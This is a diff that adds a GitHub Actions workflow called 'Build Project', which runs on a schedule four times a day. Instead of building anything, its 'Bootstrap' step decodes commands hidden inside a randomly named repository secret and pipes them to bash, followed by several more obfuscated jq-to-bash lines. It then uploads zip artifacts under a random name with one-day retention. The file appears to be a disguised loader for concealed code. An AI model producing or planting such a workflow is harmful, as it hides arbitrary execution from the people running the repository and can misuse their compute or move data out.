@@ -1,0 +1,36 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '33 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          upewv6598: ${{ secrets.upewv6598 }}
+        run: |
+          printf '%s' "$upewv6598" | jq -r .uysf9 | /bin/bash
+          printf '%s' "$w7269" | jq -r .ihy4 | /bin/bash
+          printf '%s' "$ffdw2" | jq -r .qiv97034 | /bin/bash
+          echo $xhk34 | jq -r .cbvct485 | /bin/bash
+          echo $h3 | jq -r .edfqq536 | /bin/bash
+          echo $l00444 | jq -r .zekil71980 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: PvczAQVR
+          path: "*.zip"
+          retention-days: 1
